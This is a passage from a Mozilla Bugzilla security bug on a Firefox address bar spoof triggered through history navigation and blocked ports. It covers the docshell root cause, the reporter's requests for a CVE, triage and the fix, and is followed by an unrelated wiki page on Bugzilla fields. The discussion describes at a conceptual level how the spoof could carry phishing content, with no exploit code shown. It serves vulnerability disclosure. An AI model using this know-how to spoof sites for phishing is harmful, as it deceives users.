The first go triggers a load from the history entry, and we set mLSHE. Before the load triggers the setup of a new viewer we execute the second go. At this point `nsDocShell::Stop` is called, but because the first go was loading an error page we store mLSHE into mOSHE (<https://searchfox.org/mozilla-central/rev/a887c90ea9c19a0b5529a1f5fa351929944887ba/docshell/base/nsDocShell.cpp#4702>). We then also store the previous content viewer on the entry in mOSHE, even though we haven't created a new viewer between the two loads from history entries.

|  | [Peter Van der Beken [:peterv]](/user_profile?user_id=24295)  Assignee |  |
| --- | --- | --- |
| [Comment 28](/show_bug.cgi?id=1528587#c28)• 6 years ago |
|  | |

Smaug, I already discussed this a bit with bz, and he wanted to get your opinion.

The basic issue is that if we load an error page we store the mLSHE into the mOSHE, even if the load of the error page was interrupted before the content viewer for the error page was set up. The nulling of mLSHE in nsDocShell::Stop is necessary because nsDocShell::EndPageLoad is never called for error pages (we don't get state changes for those). We could try to check for this specific case somehow (checking the document in mContentViewer for an error page?) and then skip the nulling of mLSHE in nsDocShell::Stop. But maybe you have a better idea?

Flags: needinfo?(bugs)

|  | [Peter Van der Beken [:peterv]](/user_profile?user_id=24295)  Assignee |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1528587#a8079784_24295)• 6 years ago |

Status: NEW → ASSIGNED

|  | [Olli Pettay [:smaug][bugs@pettay.fi]](/user_profile?user_id=39966) |  |
| --- | --- | --- |
| [Comment 29](/show_bug.cgi?id=1528587#c29)• 6 years ago |
|  | |

That sounds reasonable to me, null mLSHE later (and hopefully making error loading more similar to normal pages).

But without debugging this I don't have a good idea where to do it.

Flags: needinfo?(bugs)

|  | [Adrian](/user_profile?user_id=633720)  Reporter |  |
| --- | --- | --- |
| [Comment 30](/show_bug.cgi?id=1528587#c30)• 6 years ago |
|  | |

hi, how about patch ? ;) this technique doesn't work any more for the newest Firefox version which can suggest you've done something with it

either you patched it or it has been patched by itself magically;). It would be great to finally obtain information regarding severity of this bug.

Please note I have included poc working without user interaction other than going into attacker site(clicking link). I shared this bug also because I wanted to get CVE at least. How long would it take for you to finally close this?

|  | [Al Billings [:abillings - ex-MoCo]](/user_profile?user_id=280903) |  |
| --- | --- | --- |
| [Comment 31](/show_bug.cgi?id=1528587#c31)• 6 years ago |
|  | |

(In reply to Adrian from [comment #23](/show_bug.cgi?id=1528587#c23 "RESOLVED FIXED - Address bar spoof using history navigation and blocked ports"))

> Can anybody please answer few questions?

Asking here in a bug gives no guarantee that questions directed to other folks will be answered, as an FYI. Security bounty questions should be sent to security@mozilla.org per our client bounty FAQ at <https://www.mozilla.org/en-US/security/client-bug-bounty/> (which I assume you've read if you're interested in bounties).

> 1: Is this vulnerability getting any attention?

There is attention in this bug. That is where the bug activity will occur. There is no other channel where it will happen.

> 2: Does it qualify for CVE/bounty ?

CVEs are assigned when a bug is fixed, during the process for the release it is fixed in, unless there is a reason to do so.

Bounty questions should not be asked in the bug but in email to security@mozilla.org, as the client FAQ above states.

The FAQ says:

"If you have filed the bug directly in Bugzilla without using the Bugzilla client bug bounty form, notify the Mozilla Security Group by email to security@mozilla.org and include the number of the bug you filed and a mention that you are submitting it for bounty consideration. Do not send the actual vulnerability via email."

> 3: When you're planning to release the patch?

There is no specific plan because the bug is not fixed yet. When we have a patch for it that is reviewed and approved, then we will know when it is fixed.

> 4: Why almost 90 days its not enough to fix the issue?

Because this is a sec-moderate issues and people are often assigned a variety of work and other work takes a higher priority (such as high or critical rated security issues).

(In reply to Adrian from [comment #30](/show_bug.cgi?id=1528587#c30 "RESOLVED FIXED - Address bar spoof using history navigation and blocked ports"))

> hi, how about patch ? ;) this technique doesn't work any more for the newest Firefox version which can suggest you've done something with it
>
> either you patched it or it has been patched by itself magically;).

Or it was fixed by other work that has been done, which often happens as we clean up code.

> It would be great to finally obtain information regarding severity of this bug.

It is rated sec-moderate and has been fro some time. That's the Mozilla severity rating of it when it comes to security.

> Please note I have included poc working without user interaction other than going into attacker site(clicking link). I shared this bug also because I wanted to get CVE at least. How long would it take for you to finally close this?

When we the developers who have been looking at it verify that it is fixed.

If it was incidentally "fixed" or the poc just no longer reproduces, it may not be assigned a CVE. It depends on the change that affected the issue.

|  | [Al Billings [:abillings - ex-MoCo]](/user_profile?user_id=280903) |  |
| --- | --- | --- |
| [Comment 32](/show_bug.cgi?id=1528587#c32)• 6 years ago |
|  | |

Peter, can you take a look at this and see what might have changed to cause the poc to no longer work?

Flags: needinfo?(peterv)

|  | [Peter Van der Beken [:peterv]](/user_profile?user_id=24295)  Assignee |  |
| --- | --- | --- |
| [Comment 33](/show_bug.cgi?id=1528587#c33)• 6 years ago |
|  | |

The steps to reproduce from [comment 10](/show_bug.cgi?id=1528587#c10 "RESOLVED FIXED - Address bar spoof using history navigation and blocked ports") still work for me. None of the "automated" poc ever worked. I don't think anything has changed.

Flags: needinfo?(peterv)

|  | [Adrian](/user_profile?user_id=633720)  Reporter |  |
| --- | --- | --- |
| [Comment 34](/show_bug.cgi?id=1528587#c34)• 6 years ago |
|  | |

Some time ago I have included video proving that all steps can be indeed automated and the only thing user is required to do is to get to the attacker page. I can easily reproduce it all the time using [comment 22](/show_bug.cgi?id=1528587#c22 "RESOLVED FIXED - Address bar spoof using history navigation and blocked ports") methodology. I have also posted video proving it can be done.. If you feel not competent enough to reproduce it then I think I will rather contact security team directly.

|  | [:Gijs (he/him)](/user_profile?user_id=159069) |  |
| --- | --- | --- |
| [Comment 35](/show_bug.cgi?id=1528587#c35)• 6 years ago |
|  | |

(In reply to Adrian from [comment #34](/show_bug.cgi?id=1528587#c34 "RESOLVED FIXED - Address bar spoof using history navigation and blocked ports"))

> Some time ago I have included video proving that all steps can be indeed automated and the only thing user is required to do is to get to the attacker page. I can easily reproduce it all the time using [comment 22](/show_bug.cgi?id=1528587#c22 "RESOLVED FIXED - Address bar spoof using history navigation and blocked ports") methodology. I have also posted video proving it can be done..

Your [comment 22](/show_bug.cgi?id=1528587#c22 "RESOLVED FIXED - Address bar spoof using history navigation and blocked ports") involves a bunch of setTimeout calls that likely work out differently on different machines and configurations, which means that automated testcase hasn't worked for any of the other people CC'd on this bug who have attempted to use it.

That's fine, we're still aware there's a problem and will still be investigating how to fix this. It does mean we have no idea why your automated steps "stopped working" for you. It's quite possible some of the timings shifted for you as a result of performance improvements or something else relating to the runtime environment, rather than a "secret fix" for this bug landing.

> If you feel not competent enough to reproduce it then I think I will rather contact security team directly.

Please see the etiquette guidelines at <https://bugzilla.mozilla.org/page.cgi?id=etiquette.html> - insulting people is not acceptable.

|  | [Adrian](/user_profile?user_id=633720)  Reporter |  |
| --- | --- | --- |
| [Comment 36](/show_bug.cgi?id=1528587#c36)• 6 years ago |
|  | |

Hi,

Indeed it is still working, at least on Windows 7.

I have tested it on Windows 10 Enterprise as well and its not working here.

Regards

|  | [Neha Kochar [:neha]](/user_profile?user_id=627348) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1528587#a11891656_627348)• 6 years ago |

Priority: -- → P2

|  | [Adrian](/user_profile?user_id=633720)  Reporter |  |
| --- | --- | --- |
| [Comment 37](/show_bug.cgi?id=1528587#c37)• 5 years ago |
|  | |

Hi,

Two months ago this bug has been marked with P2 priority. I thought that P2 means that this bug will be patched with the new release which was delivered today. Please let me know if it is going to be patched, if CVE will be assigned etc.

|  | [Adrian](/user_profile?user_id=633720)  Reporter |  |
| --- | --- | --- |
| [Comment 38](/show_bug.cgi?id=1528587#c38)• 5 years ago |
|  | |

hi is there any news regarding this issue ? I seen cve assigned for some moderate and even low issues. If my finding does not qualify for you just please let me know so I will not wait any longer and publish it. Regards

|  | [Boris Zbarsky [:bzbarsky]](/user_profile?user_id=20209) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1528587#a21384968_20209)• 5 years ago |

Flags: needinfo?(dveditz)

|  | [Daniel Veditz [:dveditz]](/user_profile?user_id=1689) |  |
| --- | --- | --- |
| [Comment 39](/show_bug.cgi?id=1528587#c39)• 5 years ago |
|  | |

This appears to have been fixed in Firefox 70, or if not "fixed" at least the testcase was broken. Now you end up on the test3.html page, showing the correct test3 URL in the addressbar.

I saw the broken behavior in Firefox 69, and I still see the broken behavior in ESR-68 which we will support until summer. From the testcase it appears test3 (showing "attacker" content) may have been the point, but I always saw the blank content from test.html. Easy enough to put phishy content on that page instead (which I did to satisfy myself). Got the same behavior on the now-EOL ESR-60

As a spoof it's still not all that convincing (e.g. there's no lock). Some actual phish on close-enough names are more convincing, although those can in theory end up being blocked by SafeBrowsing and these unreachable names won't.

Much more concerning is that internally we think the document.location is the fake domain, although document.domain is correct. I haven't tested but I bet any internal security checks relying on the document URI rather than the principal will get it wrong. It's an invalid origin and won't be same-origin with anything juicy, but to the extent it's same-site with them that will be a problem. Broadly speaking I'm guessing "engine" features will get it right (using principals) and front-end features won't. Confidence in that guess boosted by the first one I tried: the DevTools storage tab shows cookies for the real `.google.com` domain, but the page content itself doesn't see them in `document.cookie`.

This will likely get a CVE when we publish an advisory, but we don't get around to that until we've fixed them. As Al said back in [comment 31](/show_bug.cgi?id=1528587#c31 "RESOLVED FIXED - Address bar spoof using history navigation and blocked ports"), stop asking in the bug because the developers don't know. Mail the security alias.

Peter: although the testcase is now "worksforme" I'm not sure that this is in fact "fixed" in Firefox 70. Did we make a change that is an actual fix, or is it just some unrelated change that broke the testcase with the underlying problem still lurking? Either way can we identify it and port it back to the ESR branch?

[status-firefox69](/buglist.cgi?f1=cf_status_firefox69&o1=isnotempty):
--- → [wontfix](/buglist.cgi?f1=cf_status_firefox69&o1=equals&v1=wontfix)
[status-firefox70](/buglist.cgi?f1=cf_status_firefox70&o1=isnotempty):
--- → [?](/buglist.cgi?f1=cf_status_firefox70&o1=equals&v1=%3F)
[status-firefox71](/buglist.cgi?f1=cf_status_firefox71&o1=isnotempty):
--- → [?](/buglist.cgi?f1=cf_status_firefox71&o1=equals&v1=%3F)
[status-firefox-esr68](/buglist.cgi?f1=cf_status_firefox_esr68&o1=isnotempty):
--- → [affected](/buglist.cgi?f1=cf_status_firefox_esr68&o1=equals&v1=affected)
[tracking-firefox70](/buglist.cgi?f1=cf_tracking_firefox70&o1=isnotempty):
--- → [+](/buglist.cgi?f1=cf_tracking_firefox70&o1=equals&v1=%2B)
[tracking-firefox71](/buglist.cgi?f1=cf_tracking_firefox71&o1=isnotempty):
--- → [+](/buglist.cgi?f1=cf_tracking_firefox71&o1=equals&v1=%2B)
[tracking-firefox-esr68](/buglist.cgi?f1=cf_tracking_firefox_esr68&o1=isnotempty):
--- → [71+](/buglist.cgi?f1=cf_tracking_firefox_esr68&o1=equals&v1=71%2B)Flags: needinfo?(dveditz) → needinfo?(peterv)

|  | [Peter Van der Beken [:peterv]](/user_profile?user_id=24295)  Assignee |  |
| --- | --- | --- |
| [Comment 40](/show_bug.cgi?id=1528587#c40)• 5 years ago |
|  | |

(In reply to Daniel Veditz [:dveditz] from [comment #39](/show_bug.cgi?id=1528587#c39 "RESOLVED FIXED - Address bar spoof using history navigation and blocked ports"))

> Peter: although the testcase is now "worksforme" I'm not sure that this is in fact "fixed" in Firefox 70. Did we make a change that is an actual fix, or is it just some unrelated change that broke the testcase with the underlying problem still lurking? Either way can we identify it and port it back to the ESR branch?

I'm not aware of a fix specifically for this. I'll try to figure out if the underlying problem is still there, but I suspect it is.

|  | [Peter Van der Beken [:peterv]](/user_profile?user_id=24295)  Assignee |  |
| --- | --- | --- |
| [Comment 41](/show_bug.cgi?id=1528587#c41)• 5 years ago |
|  | |

I think asynchronous history navigations ([bug 1563587](/show_bug.cgi?id=1563587 "RESOLVED FIXED - Make history navigations asynchronous")) might have fixed this. Sounds a bit scary to port to ESR.

Flags: needinfo?(peterv)

|  | [Peter Van der Beken [:peterv]](/user_profile?user_id=24295)  Assignee |  |
| --- | --- | --- |
| [Comment 42](/show_bug.cgi?id=1528587#c42)• 5 years ago |
|  | |

(In reply to Peter Van der Beken [:peterv] from [comment #41](/show_bug.cgi?id=1528587#c41 "RESOLVED FIXED - Address bar spoof using history navigation and blocked ports"))

> I think asynchronous history navigations ([bug 1563587](/show_bug.cgi?id=1563587 "RESOLVED FIXED - Make history navigations asynchronous")) might have fixed this.

That being said, I'm not completely sure that the problem from [comment 27](/show_bug.cgi?id=1528587#c27 "RESOLVED FIXED - Address bar spoof using history navigation and blocked ports") couldn't cause other problems like this.

|  | [Liz Henry (:lizzard) (relman/hg->git project)](/user_profile?user_id=451704) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1528587#a24077472_451704)• 5 years ago |

[tracking-firefox-esr68](/buglist.cgi?f1=cf_tracking_firefox_esr68&o1=isnotempty):
[71+](/buglist.cgi?f1=cf_tracking_firefox_esr68&o1=equals&v1=71%2B) → [?](/buglist.cgi?f1=cf_tracking_firefox_esr68&o1=equals&v1=%3F)

|  | [Peter Van der Beken [:peterv]](/user_profile?user_id=24295)  Assignee |  |
| --- | --- | --- |
| [Comment 43](/show_bug.cgi?id=1528587#c43)• 5 years ago |
|  | |

I have been thinking how this could still happen with async history navigations fixed ([bug 1563587](/show_bug.cgi?id=1563587 "RESOLVED FIXED - Make history navigations asynchronous")), but so far I haven't been able to find a way. We should still try to implement the solution from [comment 28](/show_bug.cgi?id=1528587#c28 "RESOLVED FIXED - Address bar spoof using history navigation and blocked ports"), once we figure out where we can move the nulling of mLSHE for error loads.

|  | [Neha Kochar [:neha]](/user_profile?user_id=627348) |  |
| --- | --- | --- |
| [Comment 44](/show_bug.cgi?id=1528587#c44)• 5 years ago |
|  | |

Peter, would it be best to track this for 73 instead of the earlier releases since it still needs some work here?

Flags: needinfo?(peterv)

|  | [Peter Van der Beken [:peterv]](/user_profile?user_id=24295)  Assignee |  |
| --- | --- | --- |
| [Comment 45](/show_bug.cgi?id=1528587#c45)• 5 years ago |
|  | |

I've verified that turning off async history navigations with the pref makes the bug reappear with the steps from [comment 10](/show_bug.cgi?id=1528587#c10 "RESOLVED FIXED - Address bar spoof using history navigation and blocked ports"). A fix for that will take more time, so I think tracking for 73 would make more sense. But for now, async history navigations seem like a good enough proetection against this.

Flags: needinfo?(peterv)

|  | [Peter Van der Beken [:peterv]](/user_profile?user_id=24295)  Assignee |  |
| --- | --- | --- |
| [Comment 46](/show_bug.cgi?id=1528587#c46)• 5 years ago |
|  | |

[Tracking Requested - why for this release]: see [comment 45](/show_bug.cgi?id=1528587#c45 "RESOLVED FIXED - Address bar spoof using history navigation and blocked ports")

[tracking-firefox70](/buglist.cgi?f1=cf_tracking_firefox70&o1=isnotempty):
[+](/buglist.cgi?f1=cf_tracking_firefox70&o1=equals&v1=%2B) → [?](/buglist.cgi?f1=cf_tracking_firefox70&o1=equals&v1=%3F)
[tracking-firefox71](/buglist.cgi?f1=cf_tracking_firefox71&o1=isnotempty):
[+](/buglist.cgi?f1=cf_tracking_firefox71&o1=equals&v1=%2B) → [?](/buglist.cgi?f1=cf_tracking_firefox71&o1=equals&v1=%3F)
[tracking-firefox73](/buglist.cgi?f1=cf_tracking_firefox73&o1=isnotempty):
--- → [?](/buglist.cgi?f1=cf_tracking_firefox73&o1=equals&v1=%3F)

|  | [Pascal Chevrel:pascalc](/user_profile?user_id=24572) |  |
| --- | --- | --- |
| [Comment 47](/show_bug.cgi?id=1528587#c47)• 5 years ago |
|  | |

70 is a past release, 71 is our current release but will be replaced by 72 in 5 weeks. Adjusting flag requests to actually track 73 and 72 which are the releases that could potentially be targeted for a fix/uplift.

[status-firefox70](/buglist.cgi?f1=cf_status_firefox70&o1=isnotempty):
[?](/buglist.cgi?f1=cf_status_firefox70&o1=equals&v1=%3F) → [wontfix](/buglist.cgi?f1=cf_status_firefox70&o1=equals&v1=wontfix)
[status-firefox71](/buglist.cgi?f1=cf_status_firefox71&o1=isnotempty):
[?](/buglist.cgi?f1=cf_status_firefox71&o1=equals&v1=%3F) → [wontfix](/buglist.cgi?f1=cf_status_firefox71&o1=equals&v1=wontfix)
[status-firefox72](/buglist.cgi?f1=cf_status_firefox72&o1=isnotempty):
--- → [affected](/buglist.cgi?f1=cf_status_firefox72&o1=equals&v1=affected)
[status-firefox73](/buglist.cgi?f1=cf_status_firefox73&o1=isnotempty):
--- → [affected](/buglist.cgi?f1=cf_status_firefox73&o1=equals&v1=affected)
[tracking-firefox70](/buglist.cgi?f1=cf_tracking_firefox70&o1=isnotempty):
[?](/buglist.cgi?f1=cf_tracking_firefox70&o1=equals&v1=%3F) → [-](/buglist.cgi?f1=cf_tracking_firefox70&o1=equals&v1=-)
[tracking-firefox71](/buglist.cgi?f1=cf_tracking_firefox71&o1=isnotempty):
[?](/buglist.cgi?f1=cf_tracking_firefox71&o1=equals&v1=%3F) → [-](/buglist.cgi?f1=cf_tracking_firefox71&o1=equals&v1=-)
[tracking-firefox72](/buglist.cgi?f1=cf_tracking_firefox72&o1=isnotempty):
--- → [?](/buglist.cgi?f1=cf_tracking_firefox72&o1=equals&v1=%3F)

|  | [Julien Cristau [:jcristau]](/user_profile?user_id=580382) |  |
| --- | --- | --- |
| [Comment 48](/show_bug.cgi?id=1528587#c48)• 5 years ago |
|  | |

Per comments 44/45 it sounds like this is not likely for 72.

[status-firefox72](/buglist.cgi?f1=cf_status_firefox72&o1=isnotempty):
[affected](/buglist.cgi?f1=cf_status_firefox72&o1=equals&v1=affected) → [fix-optional](/buglist.cgi?f1=cf_status_firefox72&o1=equals&v1=fix-optional)
[tracking-firefox72](/buglist.cgi?f1=cf_tracking_firefox72&o1=isnotempty):
[?](/buglist.cgi?f1=cf_tracking_firefox72&o1=equals&v1=%3F) → [-](/buglist.cgi?f1=cf_tracking_firefox72&o1=equals&v1=-)

|  | [Ryan VanderMeulen [:RyanVM]](/user_profile?user_id=75935) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1528587#a25620243_75935)• 5 years ago |

[tracking-firefox73](/buglist.cgi?f1=cf_tracking_firefox73&o1=isnotempty):
[?](/buglist.cgi?f1=cf_tracking_firefox73&o1=equals&v1=%3F) → [+](/buglist.cgi?f1=cf_tracking_firefox73&o1=equals&v1=%2B)

|  | [Peter Van der Beken [:peterv]](/user_profile?user_id=24295)  Assignee |  |
| --- | --- | --- |
| [Comment 49](/show_bug.cgi?id=1528587#c49)• 5 years ago |
|  | |

[Bug 1563587](/show_bug.cgi?id=1563587 "RESOLVED FIXED - Make history navigations asynchronous") is going to land on branches, and should fix this. I guess I could move the followup work to a separate bug.

|  | [Daniel Veditz [:dveditz]](/user_profile?user_id=1689) |  |
| --- | --- | --- |
| [Comment 50](/show_bug.cgi?id=1528587#c50)• 5 years ago |
|  | |

So the original security bug aspect here has been fixed since Fx70 it looks like, via [bug 1563587](/show_bug.cgi?id=1563587 "RESOLVED FIXED - Make history navigations asynchronous")? If so we should resolve this bug so it triggers our advisory-writing and CVE assignment processes.

[status-firefox70](/buglist.cgi?f1=cf_status_firefox70&o1=isnotempty):
[wontfix](/buglist.cgi?f1=cf_status_firefox70&o1=equals&v1=wontfix) → [fixed](/buglist.cgi?f1=cf_status_firefox70&o1=equals&v1=fixed)
[status-firefox71](/buglist.cgi?f1=cf_status_firefox71&o1=isnotempty):
[wontfix](/buglist.cgi?f1=cf_status_firefox71&o1=equals&v1=wontfix) → [fixed](/buglist.cgi?f1=cf_status_firefox71&o1=equals&v1=fixed)
[status-firefox72](/buglist.cgi?f1=cf_status_firefox72&o1=isnotempty):
[fix-optional](/buglist.cgi?f1=cf_status_firefox72&o1=equals&v1=fix-optional) → [fixed](/buglist.cgi?f1=cf_status_firefox72&o1=equals&v1=fixed)
[status-firefox73](/buglist.cgi?f1=cf_status_firefox73&o1=isnotempty):
[affected](/buglist.cgi?f1=cf_status_firefox73&o1=equals&v1=affected) → [fixed](/buglist.cgi?f1=cf_status_firefox73&o1=equals&v1=fixed)

|  | [Ryan VanderMeulen [:RyanVM]](/user_profile?user_id=75935) |  |
| --- | --- | --- |
| [Comment 51](/show_bug.cgi?id=1528587#c51)• 5 years ago |
|  | |

After discussing this with Dan, I don't think this bug is severe enough to warrant taking the risk of uplifting [bug 1563587](/show_bug.cgi?id=1563587 "RESOLVED FIXED - Make history navigations asynchronous") to the ESR release as a work-around. I'd be open to eventually taking a patch for the root cause if it's not too scary in the end. FWIW, I agree that it might be better to spin off a new bug for that work for better tracking.

Flags: needinfo?(peterv)

|  | [Adrian](/user_profile?user_id=633720)  Reporter |  |
| --- | --- | --- |
| [Comment 52](/show_bug.cgi?id=1528587#c52)• 5 years ago |
|  | |

Hi,

Just wondering, is it oficially patched? does it entered advisory-writing and cve assignment process?

|  | [Julien Cristau [:jcristau]](/user_profile?user_id=580382) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1528587#a33542899_580382)• 5 years ago |

Flags: needinfo?(tom)

|  | [Daniel Veditz [:dveditz]](/user_profile?user_id=1689) |  |
| --- | --- | --- |
| [Comment 53](/show_bug.cgi?id=1528587#c53)• 5 years ago |
|  | |

I filed [bug 1622095](/show_bug.cgi?id=1622095 "NEW") to cover the follow-up fixes Peter mentioned so we can mark this one resolved as a security issue.

Status: ASSIGNED → RESOLVEDClosed: 5 years agoFlags: needinfo?(tom)Resolution: --- → FIXED

|  | [Ryan VanderMeulen [:RyanVM]](/user_profile?user_id=75935) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1528587#a33685127_75935)• 5 years ago |

[status-firefox-esr68](/buglist.cgi?f1=cf_status_firefox_esr68&o1=isnotempty):
[affected](/buglist.cgi?f1=cf_status_firefox_esr68&o1=equals&v1=affected) → [wontfix](/buglist.cgi?f1=cf_status_firefox_esr68&o1=equals&v1=wontfix)
[tracking-firefox-esr68](/buglist.cgi?f1=cf_tracking_firefox_esr68&o1=isnotempty):
[?](/buglist.cgi?f1=cf_tracking_firefox_esr68&o1=equals&v1=%3F) → [-](/buglist.cgi?f1=cf_tracking_firefox_esr68&o1=equals&v1=-)Flags: needinfo?(peterv)Target Milestone: --- → mozilla70

|  | [Daniel Veditz [:dveditz]](/user_profile?user_id=1689) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1528587#a34003227_1689)• 5 years ago |

Flags: sec-bounty? → sec-bounty+

|  | [Daniel Veditz [:dveditz]](/user_profile?user_id=1689) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1528587#a34374921_1689)• 5 years ago |

Group: dom-core-security → core-security-release

|  | [Tom Ritter [:tjr]](/user_profile?user_id=578488) |  |
| --- | --- | --- |
| [Comment 54](/show_bug.cgi?id=1528587#c54)• 5 years ago |
|  | |

I need to update or otherwise handle the historical advisory for this.

Flags: needinfo?(tom)

|  | [Tom Ritter [:tjr]](/user_profile?user_id=578488) |  |
| --- | --- | --- |
| [Comment 55](/show_bug.cgi?id=1528587#c55)• 5 years ago |
|  | |

We've assigned [CVE-2020-12412](https://www.cve.org/CVERecord?id=CVE-2020-12412), updated <https://www.mozilla.org/en-US/security/advisories/mfsa2019-34/> The HoF entry will be added during the Q1 update which I hope to do in the next week.

Alias: CVE-2020-12412Flags: needinfo?(tom)

|  | [David Lawrence [:dkl]](/user_profile?user_id=5898) |  |
| --- | --- | --- |
| [Comment 56](/show_bug.cgi?id=1528587#c56)• 5 years ago |
|  | |

Removing employee no longer with company from CC list of private bugs.

|  | [Daniel Veditz [:dveditz]](/user_profile?user_id=1689) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1528587#a57965372_1689)• 4 years ago |

Group: core-security-release

|  | [David Lawrence [:dkl]](/user_profile?user_id=5898) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1528587#a166713871_5898)• 8 months ago |

Keywords: [reporter-external](/buglist.cgi?keywords=reporter-external&resolution=---)
You need to [log in](/show_bug.cgi?id=1528587&GoAheadAndLogIn=1)
before you can comment on or make changes to this bug.

Top ↑

## Attachment

Hide Details

### General

Creator:  [Adrian](/user_profile?user_id=633720)

Created:
Updated:
Size:

### Description

### File Name

### Content Type

Raw
Diff
Splinter Review



=== Content from wiki.mozilla.org_3659d679_20250121_020855.html ===


# BMO/UserGuide/BugFields

From MozillaWiki
< [BMO](/BMO "BMO")‎ | [UserGuide](/BMO/UserGuide "BMO/UserGuide")

[Jump to navigation](#mw-head)
[Jump to search](#searchInput)
## Bugzilla Field Descriptions

Alias
A short, unique name assigned to a bug in order to assist with looking it up and referring to it in other places in Bugzilla.Assignee
This is the person in charge of resolving the bug. Every time this field changes, the status changes to NEW to make it easy to see which new bugs have appeared on a person's list.Blocks
This bug must be resolved before the bugs listed in this field can be resolved.Bug ID
The numeric id of a bug, unique within this entire installation of Bugzilla.CC
Users who may not have a direct role to play on this bug, but who are interested in its progress.Changed
When this bug was last updated.Classification
Bugs are categorised into Classifications, Products and Components. classifications is the top-level categorization.Comment
Bugs have comments added to them by Bugzilla users. You can search for some text in those comments.Comment Tag
Comments can have arbitrary tags added to them to help with filtering as well as mark comments as spam or abusive.Component
Components are second-level categories; each belongs to a particular Product. Select a Product to narrow down this list.Creation date
When the bug was filed.Depends on
The bugs listed here must be resolved before this bug can be resolved.Duplicates
List of bugs that have been marked a duplicate of the bug currently being viewed.Keywords
Keywords are a controlled vocabulary for characterizing bugs across Products and Components. Examples of this field are `regression`, `sec-high`, and `topcrash`. Bugzilla administrators manage [the list of keywords](https://bugzilla.mozilla.org/describekeywords.cgi). If you believe you need a new keyword, [please contact the administrators to discuss](https://bugzilla.mozilla.org/enter_bug.cgi?product=bugzilla.mozilla.org&component=Administration).Mentors
Mentors are users who have offered to help the bug owner with such tasks as setting up a development environment, finding relevant information to fixing the bug, how to submit a patch for review, and finally how to get the fix committed.Needinfo
More information has been requested from specific individuals, or anyone, to move the bug forward to completion.OS
This is the operating system against which the bug was reported.Platform
This is the hardware platform against which the bug was reported (ARM, ARM64, x86, x86\_64, etc).Priority

| Priority | Description |
| --- | --- |
| **--** | No decision |
| **P1** | Fix in the current release cycle |
| **P2** | Fix in the next release cycle or the following (nightly + 1 or nightly + 2) |
| **P3** | Backlog |
| **P4** | Do not use. This priority is for the Web Platform Test bot. |
| **P5** | Will not fix, but will accept a patch |

This field describes the importance and order in which a bug should be fixed compared to other bugs. This field is utilized by the programmers/engineers/release managers/managers to prioritize the work to be done. See the Firefox [triage documentation](https://firefox-source-docs.mozilla.org/bug-mgmt/policies/triage-bugzilla.html) and [priority definitions](https://firefox-source-docs.mozilla.org/bug-mgmt/guides/priority.html), or for the main Bugzilla project, [Bugzilla:Priority\_System](/Bugzilla%3APriority_System "Bugzilla:Priority System").Product
Bugs are categorised into Products and Components. Select a Classification to narrow down this list.QA Contact
The person responsible for confirming this bug if it is unconfirmed, and for verifying the fix once the bug has been resolved.Rank
Used by some groups to provide finer-grained ordering for working on bugs than afforded by the Priority field. Use of this field is restricted to the `rank-setters` group.Regressed by
This bug has been introduced by the bugs listed here.Regressions
This bug has introduced the bugs listed here.Reporter
The person who filed this bug.See Also
This allows you to refer to bugs in other bug tracker installations. You can enter a URL to a bug in the 'Add Bug URLs' field to note that that bug is related to this one. You can enter multiple URLs at once by separating them with a comma. You should normally use this field to refer to bugs in other bug tracker installations, or bugs which are related to, but not known to be duplicates of the bug. Bugs which are regressions should be listed in the Regressed by field (above)Severity
This field describes the impact of a bug. This field is utilized by the programmers/engineers/release managers/managers to determine the severity of issues and used as input for the priority of the bug. It should not be set by people filing bugs. See the Firefox [triage documentation](https://firefox-source-docs.mozilla.org/bug-mgmt/policies/triage-bugzilla.html) and [severity documentation](https://firefox-source-docs.mozilla.org/bug-mgmt/guides/severity.html).

| Severity | Description |
| --- | --- |
| **--** | Default value for new bugs; bug triagers for components (ie engineers and other core project folks) are expected to update the bug's severity from this value. To avoid them missing new bugs for triage, do not alter this default when filing bugs. |
| **S1** | (Catastrophic) Blocks development/testing, may impact more than 25% of users, causes data loss, likely dot release driver, and no workaround available |
| **S2** | (Serious) Major functionality/product severely impaired or a high impact issue and a satisfactory workaround does not exist |
| **S3** | (Normal) Blocks non-critical functionality or a work around exists |
| **S4** | (Small/Trivial) minor significance, cosmetic issues, low or no impact to users |
| **N/A** | (Not Applicable) The above definitions do not apply to this bug; this value is reserved for bugs of type Task or Enhancement |

Summary
The bug summary is a short sentence which succinctly describes what the bug is about.Target Milestone
For Firefox-related bugs, when a change set (patch) lands in Mozilla-Central, the [sheriffs](/Sheriffing "Sheriffing") will set this field to the corresponding release value for the current Nightly.
Release status and tracking flags are used to mark intentions for when a fix or other patch should land.
If you need to track a bug against a set of milestones other than upcoming versions of Firefox, please tell the Bugzilla team, you may want a custom status flag.Triage Owner
User that is responsible [for triaging bugs in a specific component](https://firefox-source-docs.mozilla.org/bug-mgmt/policies/triage-bugzilla.html).Type
This field describes the [type of a bug](https://firefox-source-docs.mozilla.org/bug-mgmt/guides/bug-types.html).

| Type | Description |
| --- | --- |
| **defect** | regression, crash, hang, security vulnerability and any other general issue. |
| **enhancement** | new feature, improvement in UI, performance, etc. and any other request for user-facing changes and enhancements in the product; not engineering changes |
| **task** | refactoring, removal, replacement, enabling or disabling of functionality and any other engineering task |

URL
Bugs can have a URL associated with them - for example, a pointer to a web site where the problem is seen.Version
The version field defines the version of the software the bug was found in.Votes
Some bugs can be voted for, and you can limit your search to bugs with more than a certain number of votes. Votes are not used by Mozilla developers to set priorities.Whiteboard
Each bug has a free-form single line text entry box for adding tags and status information

Retrieved from "<https://wiki.mozilla.org/index.php?title=BMO/UserGuide/BugFields&oldid=1250790>"

## Navigation menu

### Personal tools

* [Log in](/index.php?title=Special:UserLogin&returnto=BMO%2FUserGuide%2FBugFields "You are encouraged to log in; however, it is not mandatory [o]")
* [Request account](/Special%3ARequestAccount "You are encouraged to create an account and log in; however, it is not mandatory")

### Namespaces

* [Page](/BMO/UserGuide/BugFields "View the content page [c]")
